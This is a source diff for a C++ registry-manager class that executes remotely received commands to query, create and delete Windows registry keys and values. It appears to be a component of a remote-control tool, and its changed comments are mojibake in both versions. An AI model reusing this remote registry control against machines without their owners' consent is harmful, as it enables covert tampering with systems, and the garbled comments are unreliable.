@@ -1,4 +1,4 @@
-ï»¿// RegManager.cpp: implementation of the CRegManager class.
+// RegManager.cpp: implementation of the CRegManager class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
@@ -22,14 +22,14 @@ CRegManager::~CRegManager()
 	
 }
 
-//æ²¡æœ‰æ‰§è¡ŒæˆåŠŸ
+//Ã»ÓĞÖ´ĞĞ³É¹¦
 void CRegManager::SendNO()
 {
 	BYTE bToken=TOKEN_REG_NO;
 	Send(&bToken, sizeof(BYTE));
 }
 
-//æ‰§è¡ŒæˆåŠŸ
+//Ö´ĞĞ³É¹¦
 void CRegManager::SendOK()
 {
 	BYTE bToken=TOKEN_REG_OK;
@@ -40,22 +40,22 @@ void CRegManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
 	switch (lpBuffer[0])
 	{
-	case COMMAND_REG_FIND:             //æŸ¥æ•°æ®
+	case COMMAND_REG_FIND:             //²éÊı¾İ
 		if(nSize>=3)
 			Find(lpBuffer[1],(char*)(lpBuffer+2));
 		else
 			Find(lpBuffer[1],NULL);
 		break;
-	case COMMAND_REG_DELPATH:          //åˆ é™¤é¡¹
+	case COMMAND_REG_DELPATH:          //É¾³ıÏî
 		DelPath((char*)lpBuffer+1);
 		break;
-	case COMMAND_REG_CREATEPATH:       //åˆ›å»ºé¡¹
+	case COMMAND_REG_CREATEPATH:       //´´½¨Ïî
 		CreatePath((char*)lpBuffer+1);
 		break;
-	case COMMAND_REG_DELKEY:           //åˆ é™¤é”®
+	case COMMAND_REG_DELKEY:           //É¾³ı¼ü
 		DelKey((char*)lpBuffer+1);
 		break;
-	case COMMAND_REG_CREATKEY:         //åˆ›å»ºå­é”®
+	case COMMAND_REG_CREATKEY:         //´´½¨×Ó¼ü
 		CreateKey((char*)lpBuffer+1);
 		break;
 	default:
@@ -63,7 +63,7 @@ void CRegManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	}
 }
 
-//æŸ¥è¯¢
+//²éÑ¯
 void CRegManager::Find(char bToken,char* path)
 {
 	RegeditOpt  reg(bToken);
@@ -91,7 +91,7 @@ void CRegManager::Find(char bToken,char* path)
 	}
 }
 
-//åˆ é™¤æŒ‡å®šé¡¹
+//É¾³ıÖ¸¶¨Ïî
 void CRegManager::DelPath(char *buf)
 {
 	CRegistry reg(buf[0]);
@@ -105,7 +105,7 @@ void CRegManager::DelPath(char *buf)
 	}
 }
 
-//åˆ›å»ºé¡¹
+//´´½¨Ïî
 void CRegManager::CreatePath(char *buf)
 {
 	CRegistry reg(buf[0]);
@@ -117,7 +117,7 @@ void CRegManager::CreatePath(char *buf)
 	}
 }
 
-//åˆ é™¤é”®
+//É¾³ı¼ü
 void CRegManager::DelKey(char *buf)
 {
 	CRegistry reg(buf[0]);
@@ -127,7 +127,7 @@ void CRegManager::DelKey(char *buf)
 	if(msg.valsize>0)
 	{
 		if(msg.size>0)
-		{ //å…ˆå¤„ç†é¡¹
+		{ //ÏÈ´¦ÀíÏî
 			char* path=new char[msg.size+1];
 			ZeroMemory(path,msg.size+1);
 			memcpy(path,tmp,msg.size);
@@ -159,18 +159,18 @@ void CRegManager::DelKey(char *buf)
 	}
 }
 
-//åˆ›å»ºå­é”®
+//´´½¨×Ó¼ü
 void CRegManager::CreateKey(char *buf)
 {
 	switch(buf[0])
 	{
-	case MREG_SZ:          //å­—ç¬¦
+	case MREG_SZ:          //×Ö·û
 		TestSTR(buf+1);
 		break;
 	case MREG_DWORD:       //DWORD
 		TestDWORD(buf+1);
 		break;
-	case MREG_EXPAND_SZ:   //å¯æ‰©å±•å­—ç¬¦
+	case MREG_EXPAND_SZ:   //¿ÉÀ©Õ¹×Ö·û
 		TestEXSTR(buf+1);
 		break;
 	default:
@@ -178,7 +178,7 @@ void CRegManager::CreateKey(char *buf)
 	} 
 }
 
-//å­—ä¸²å€¼
+//×Ö´®Öµ
 void CRegManager::TestSTR(char *buf)
 {
 	CRegistry reg(buf[0]);
@@ -188,7 +188,7 @@ void CRegManager::TestSTR(char *buf)
 	if(msg.valsize>0&&msg.size>0)
 	{   
 		if(msg.count>0)
-		{                //å…ˆå¤„ç†é¡¹
+		{                //ÏÈ´¦ÀíÏî
 			char* path=new char[msg.count+1];
 			ZeroMemory(path,msg.count+1);
 			memcpy(path,tmp,msg.count);
@@ -227,9 +227,9 @@ DWORD atod(char* ch)
 	DWORD d=0;
 	for(int i=0;i<len;i++)
 	{
-		int t=ch[i]-48;   //è¿™ä½ä¸Šçš„æ•°å­—
+		int t=ch[i]-48;   //ÕâÎ»ÉÏµÄÊı×Ö
 		if(ch[i]>57||ch[i]<48)
-		{          //ä¸æ˜¯æ•°å­—
+		{          //²»ÊÇÊı×Ö
 			return d;
 		}
 		d*=10;
@@ -238,7 +238,7 @@ DWORD atod(char* ch)
 	return d;
 }
 
-//DWORD å€¼
+//DWORD Öµ
 void CRegManager::TestDWORD(char *buf)
 {
 	CRegistry reg(buf[0]);
@@ -248,7 +248,7 @@ void CRegManager::TestDWORD(char *buf)
 	if(msg.valsize>0&&msg.size>0)
 	{   
 		if(msg.count>0)
-		{                //å…ˆå¤„ç†é¡¹
+		{                //ÏÈ´¦ÀíÏî
 			char* path=new char[msg.count+1];
 			ZeroMemory(path,msg.count+1);
 			memcpy(path,tmp,msg.count);
@@ -272,7 +272,7 @@ void CRegManager::TestDWORD(char *buf)
 		ZeroMemory(key,msg.size+1);
 		memcpy(key,tmp,msg.size);
 		tmp+=msg.size;
-		DWORD d=atod(tmp);               //å˜ä¸ºdword
+		DWORD d=atod(tmp);               //±äÎªdword
 		if(reg.Write(key,d)){
 			SendOK();
 		}else{
@@ -282,7 +282,7 @@ void CRegManager::TestDWORD(char *buf)
 	}
 }
 
-//å¯æ‰©å±•å¤„ç†
+//¿ÉÀ©Õ¹´¦Àí
 void CRegManager::TestEXSTR(char *buf)
 {
 	CRegistry reg(buf[0]);
@@ -292,7 +292,7 @@ void CRegManager::TestEXSTR(char *buf)
 	if(msg.valsize>0&&msg.size>0)
 	{   
 		if(msg.count>0)
-		{                //å…ˆå¤„ç†é¡¹
+		{                //ÏÈ´¦ÀíÏî
 			char* path=new char[msg.count+1];
 			ZeroMemory(path,msg.count+1);
 			memcpy(path,tmp,msg.count);
